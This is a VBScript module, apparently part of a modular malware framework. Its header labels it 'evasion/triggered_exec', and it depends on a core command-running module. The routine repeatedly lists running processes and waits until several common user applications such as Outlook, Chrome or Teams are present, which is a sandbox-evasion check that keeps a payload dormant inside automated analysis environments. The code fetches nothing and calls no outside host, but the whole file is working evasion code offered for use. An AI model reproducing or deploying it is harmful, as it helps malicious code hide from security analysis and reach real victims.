' chunk: evasion/triggered_exec
' depends: core/run_cmd
' provides: wait_for_activity
' format: vbscript
' note: Wait for user interactive activity before proceeding

Sub wait_for_activity()
    On Error Resume Next
    Dim found, attempts, result, procs
    found = False
    attempts = 0
    Do While Not found And attempts < 30
        result = LCase(_run("tasklist /fo csv /nh"))
        procs = Array("explorer.exe", "chrome.exe", "firefox.exe", _
                       "outlook.exe", "excel.exe", "winword.exe", _
                       "teams.exe", "slack.exe")
        Dim i, count
        count = 0
        For i = 0 To UBound(procs)
            If InStr(result, procs(i)) > 0 Then
                count = count + 1
            End If
        Next
        If count >= 2 Then
            found = True
        Else
            WScript.Sleep 10000
            attempts = attempts + 1
        End If
    Loop
End Sub
